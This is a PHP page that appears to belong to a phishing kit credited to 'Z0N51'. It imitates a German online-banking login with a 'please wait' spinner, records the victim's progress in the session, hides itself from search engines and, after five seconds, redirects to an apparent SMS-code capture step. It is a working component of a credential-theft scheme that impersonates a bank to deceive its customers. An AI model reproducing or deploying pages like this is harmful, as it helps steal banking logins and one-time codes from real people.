<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'loading2';
?>
<!doctype html>
<html>

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/helpers.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/bundle.css">

    <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

    <title>Login</title>
</head>

<body>

    <!-- HEADER -->
    <header style="margin-bottom: 9%;" class="header header--g2p header--subpage u-print-hidden"
        data-login-state="logged-in" role="banner">
        <div class="header__inner">
            <a class="u-left">
                <img src="../assets/imgs/logoo.png" />
            </a>
        </div>
    </header>
    <main id="main">
        <div class="container">

            <div class="login-area">
                <h3 class="mb-2" style="color: #ff781c;">Online-Banking: Login</h3>
                <h4 style="color: #ff781c;">Überprüfen Sie Ihre Angaben</h4>
            </div>
            <br><br><br><br><br><br>
            <div class="busy-indicator" aria-hidden="true" role="dialog" aria-labelledby="modal_title" id="id10"
                data-delay="1000" data-busyindicator="" data-timeout="30000">
                <div class="busy-indicator-content js_holder" role="document" style="width: initial;">
                    <p class="u-flex-center">
                        <i class="icon-busy" aria-hidden="true">
                            <i class="busy-block busy-1"></i>
                            <i class="busy-block busy-2"></i>
                            <i class="busy-block busy-3"></i>
                        </i>
                    </p>
                    <p class="gs-span-20 gs-span-10-sm gap-top-0 gap-bottom-0 u-text-center">
                        <b class="u-line-break">Bitte warten</b>
                    </p>
                </div>
            </div>
        </div>
    </main>


        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            setTimeout(function () {
                window.location.href= '../index.php?redirection=sms';
            },5000); // 1000 = 1s
        </script>

    </body>

</html>